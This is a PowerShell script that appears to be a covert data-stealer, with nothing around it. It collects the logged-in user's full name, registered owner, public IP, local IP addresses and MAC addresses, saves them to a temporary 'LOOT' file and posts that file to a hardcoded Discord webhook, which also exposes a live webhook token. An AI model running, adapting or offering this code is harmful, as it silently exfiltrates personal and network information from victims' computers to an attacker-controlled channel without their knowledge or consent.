$FileName = "$env:tmp/$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm).txt"
$dc= "https://discord.com/api/webhooks/1312765751668641902/hr5aG72Num4byL408C_syhc-Owz8FWMohO-PfITGT4etj77_DLKG32Ac1ruadc12PGnG"
#------------------------------------------------------------------------------------------------------------------------------------

function Get-fullName {
    try {
        $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
    }
    # If no name is detected function will return $env:UserName 
    catch {Write-Error "No name was detected" 
        return $env:UserName
        -ErrorAction SilentlyContinue
    }
    return $fullName
}

$fullName = Get-fullName

#------------------------------------------------------------------------------------------------------------------------------------

function Get-email {
    try {
        $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
        return $email
    }
    # If no email is detected function will return backup message for sapi speak
    catch {Write-Error "An email was not found" 
        return "No Email Detected"
        -ErrorAction SilentlyContinue
    }        
}

$email = Get-email

#------------------------------------------------------------------------------------------------------------------------------------

try { 
    $computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
} catch {
    $computerPubIP = "Error getting Public IP"
}

$localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 | Select InterfaceAlias, IPAddress, PrefixOrigin | Out-String
$MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*"| Select Name, MacAddress, Status | Out-String

#------------------------------------------------------------------------------------------------------------------------------------

$output = @"
Full Name: $fullName
Email: $email
------------------------------------------------------------------------------------------------------------------------------
Public IP: 
$computerPubIP
Local IPs:
$localIP
MAC:
$MAC
"@

$output > $FileName

#------------------------------------------------------------------------------------------------------------------------------------

function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text
    )

    $hookurl = "$dc"  # Discord webhook URL

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not ([string]::IsNullOrEmpty($file))) {
        curl.exe -F "file1=@$file" $hookurl
    }
}

if (-not ([string]::IsNullOrEmpty($dc))) {
    Upload-Discord -file "$FileName"
}
